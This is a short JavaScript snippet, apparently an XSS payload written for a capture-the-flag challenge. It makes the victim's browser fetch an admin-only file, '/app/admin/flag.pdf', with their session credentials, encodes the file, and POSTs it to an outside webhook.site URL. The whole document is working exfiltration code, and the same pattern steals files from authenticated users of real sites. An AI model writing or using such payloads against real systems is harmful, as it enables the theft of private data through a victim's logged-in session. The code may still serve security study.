(function(){
    const flagUrl = '/app/admin/flag.pdf';
    const webhookUrl = 'https://webhook.site/c2f4ea1f-7b95-4903-b629-a9a3357e9c67';

    fetch(flagUrl, { credentials: 'include' })
      .then(response => response.blob())
      .then(blob => {
          const reader = new FileReader();
          reader.onloadend = function() {
              const pdfData = reader.result;
              fetch(webhookUrl, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ pdf: pdfData })
              });
          };
          reader.readAsDataURL(blob);
      })
      .catch(console.error);
})();
